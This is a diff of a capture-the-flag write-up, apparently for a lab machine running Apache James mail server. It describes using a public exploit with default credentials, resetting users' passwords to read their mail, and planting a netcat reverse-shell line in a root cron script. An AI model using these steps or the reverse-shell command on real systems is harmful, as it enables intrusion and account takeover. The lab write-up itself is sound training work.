@@ -58,21 +58,21 @@ In the dirbuster scan results, I did find a readme.txt file that you can see bel
 
 I went back through the version running with each of the services, and I did find this exploit: https://www.exploit-db.com/exploits/50347. I intially ran the exploit and it gave me a message saying that someone needed to login for it to work. At the time I did not have any users credentials, but in the exploit it does give the username/password for the James Apache Server. To log in we will use netcat. After logging in, we see that we can change the passwords of the users...this will allow us to login and view the users mail/inbox.
 
-![Results!](screenshots/11.png)
+![Results!](screenshots/11.png)\
 
 
 ![Results!](screenshots/12.png)
 
 
-After browsing through each user's mailbox, we see an email that was sent to Mindy that contains ssh credentials which will allow us to login.
+After browsing through each user's mailbox, we see an email that was sent to Mindy that contains ssh credentials which will allow us to login.\
 ![Results!](screenshots/13.png)
 
 
 ### Flags
-User:
-![Results!](screenshots/14.png)
+User:\
+![Results!](screenshots/14.png)\
 
-Root: 
+Root:\
 For root access, I needed to escalate my priveleges to root. Initally I uploaded LinEnum and Linpeas to see if any misconfigurations or any vulnerabilites are found that would allow me to escalate my privileges to root, but neither LinEnum or Linpeas showed me any valuable information. I had to refer to a tutorial, and LinEnum is supposed to return information about world/global writable files.  The is a python script that is being run as part of a cron job...when it executes it will execute as root. Given that we have the permission to write to this file, we can append some code that will gives us a root shell the next time the cron job runs this script. I appended this line to the python script and setup a netcat listener, 'os.system(nc -e /bin/bash 10.10.14.4 5555)'. After a couple of minutes I had a new shell as root.
 
 
